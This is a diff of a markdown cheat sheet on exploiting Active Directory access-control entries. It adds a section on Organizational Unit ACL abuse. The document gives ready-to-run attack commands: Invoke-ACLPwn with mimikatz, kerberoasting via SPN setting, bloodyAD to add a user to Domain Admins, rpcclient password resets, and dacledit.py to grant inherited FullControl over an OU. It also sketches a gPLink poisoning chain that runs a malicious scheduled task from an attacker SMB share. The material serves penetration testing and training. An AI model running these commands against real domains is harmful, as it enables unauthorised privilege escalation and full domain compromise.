@@ -1,20 +1,24 @@
 # Active Directory - Access Controls ACL/ACE
 
-* ACL: Access Control Lists
-* ACE: Access Control Entry
+An **Access Control Entry (ACE)** is a specific permission granted or denied to a user or group for a particular resource, such as a file or directory. Each ACE defines the type of access allowed (e.g., read, write, execute) or denied.
+
+An **Access Control List (ACL)** is a collection of Access Control Entries (ACEs) associated with a resource.    
 
 * Check ACL for an User with [ADACLScanner](https://github.com/canix1/ADACLScanner).
-```ps1
-ADACLScan.ps1 -Base "DC=contoso;DC=com" -Filter "(&(AdminCount=1))" -Scope subtree -EffectiveRightsPrincipal User1 -Output HTML -Show
-```
+	```ps1
+	ADACLScan.ps1 -Base "DC=contoso;DC=com" -Filter "(&(AdminCount=1))" -Scope subtree -EffectiveRightsPrincipal User1 -Output HTML -Show
+	```
 
 * Automate ACL exploit [Invoke-ACLPwn](https://github.com/fox-it/Invoke-ACLPwn):
-```ps1
-./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username 'user1' -Domain 'domain.local' -Password 'Welcome01!'
-```
+	```ps1
+	./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username 'user1' -Domain 'domain.local' -Password 'Welcome01!'
+	```
+
 
 ## GenericAll/GenericWrite
+
 ### User/Computer
+
 * We can set a **SPN** on a target account, request a Service Ticket (ST), then grab its hash and kerberoast it.
 	* Windows/Linux
 		```ps1
@@ -113,7 +117,8 @@ ADACLScan.ps1 -Base "DC=contoso;DC=com" -Filter "(&(AdminCount=1))" -Scope subtr
 		```
 
 ### Group
-* This allows us to add ourselves to the Domain Admin group : 
+
+* This ACE allows us to add ourselves to the Domain Admin group : 
 	* Windows/Linux:
 		```ps1
 		bloodyAD --host 10.10.10.10 -d example.lab -u hacker -p MyPassword123 add groupMember 'Domain Admins' hacker
@@ -250,6 +255,56 @@ An attacker can change the password of the user this ACE applies to:
 	rpcclient -U 'attacker_user%my_password' -W DOMAIN -c "setuserinfo2 target_user 23 target_newpwd" 
 	```
 
+## Organizational Units ACL
+
+Access rights granted on Organizational Units can be exploited to compromise all the objects that are contained in it.
+
+* [synacktiv/OUned](https://github.com/synacktiv/OUned) - The OUned project automating Active Directory Organizational Units ACL exploitation through gPLink poisoning
+
+
+### Non privileged objects
+
+A user having the `GenericAll` right (and thus `WriteDACL` permissions) over an OU could add a `FullControl` ACE to the OU and specify that this ACE should be inherited, which will effectively lead to the compromise of all child objects since they will inherit said ACE. 
+
+* Grant `Full Control` on **SERVERS** OU
+	```ps1
+	dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'username' -target-dn 'OU=SERVERS,DC=lab,DC=local' 'lab.local'/'username':'Password1'
+	```
+
+*  Verify that we have `Full Control` ACL on **AD01-SRV1** inside **SERVERS**
+	```ps1
+	dacledit.py -action 'read' -principal 'username' -target-dn 'CN=AD01-SRV1,OU=SERVERS,DC=lab,DC=local' 'lab.local'/'username':'Password1'
+	```
+
+:warning: ACE inheritance from parent objects is disabled for `adminCount=1`
+
+
+### Privileged objects
+
+**Requirements**:
+
+- `GenericWrite` OR `Manage Group Policy` links
+- Create a machine account
+- Add new DNS records
+
+
+**Attack's Flow**: gPLink -> Attacker GPC FQDN -> GPT configuration files in Attacker SMB share -> execute a malicious scheduled task
+
+* Edit the `gPLink` value to include a GPC FQDN pointing the attacker machine
+* Create a fake LDAP server mimicking the real one, but with a custom GPC
+* GPC's gPCFileSysPath value is pointing to the attacker SMB share
+* The SMB share is serving GPT configuration files including a malicious scheduled task
+
+
+**Exploit**:
+
+Check this [blog post from Synacktiv](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory) to correctly setup all the requirements for this attack to succeeded.
+
+```ps1
+sudo python3 OUned.py --config config.ini
+sudo python3 OUned.py --config config.example.ini --just-coerce
+```
+
 
 ## References
 
@@ -257,3 +312,5 @@ An attacker can change the password of the user this ACE applies to:
 * [Access Control Entries (ACEs) - The Hacker Recipes - @_nwodtuhs](https://www.thehacker.recipes/active-directory-domain-services/movement/abusing-aces)
 * [Escalating privileges with ACLs in Active Directory - April 26, 2018 - Rindert Kramer and Dirk-jan Mollema](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
 * [Training - Attacking and Defending Active Directory Lab - Altered Security](https://www.alteredsecurity.com/adlab)
+* [OU having a laugh? - Petros Koutroumpis - 6 November, 2019](https://labs.withsecure.com/publications/ou-having-a-laugh)
+* [OUNED.PY: EXPLOITING HIDDEN ORGANIZATIONAL UNITS ACL ATTACK VECTORS IN ACTIVE DIRECTORY - Quentin Roland - 19/04/2024](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
